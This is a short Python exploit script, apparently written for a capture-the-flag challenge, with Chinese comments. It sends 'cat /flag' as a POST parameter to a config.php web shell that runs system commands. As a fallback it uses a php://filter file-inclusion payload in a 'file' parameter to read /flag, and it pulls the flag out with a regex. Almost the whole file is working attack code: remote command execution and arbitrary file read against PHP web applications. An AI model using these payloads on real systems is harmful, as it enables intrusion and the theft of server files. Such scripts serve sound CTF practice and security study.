import re
import requests
import time
import sys

# 正则不等式匹配flag
def find_flag (str):
    pattern = r'^flag\{.*\}$'
    result = re.match(pattern, str).group(0)
    return result

# 初始化
try:
    HOST = sys.argv[1]
    PORT = sys.argv[2]
except:
    pass


url=f"http://{HOST}:{PORT}/config/config.php?0=system"
uri=""
target=url+uri
data={
    '1':'cat /flag'
}
url2=f"http://{HOST}:{PORT}/?c=index&a=show_pic&file=php://filter/resource=/flag"

def exp_post(data):
    return requests.post(target,data=data).text()





try:
    a=requests.post(target,data=data)
    print(find_flag(a.text))
except Exception as e:
    a=requests.post(url2)
    print((str(a.text)[-43:-1]))
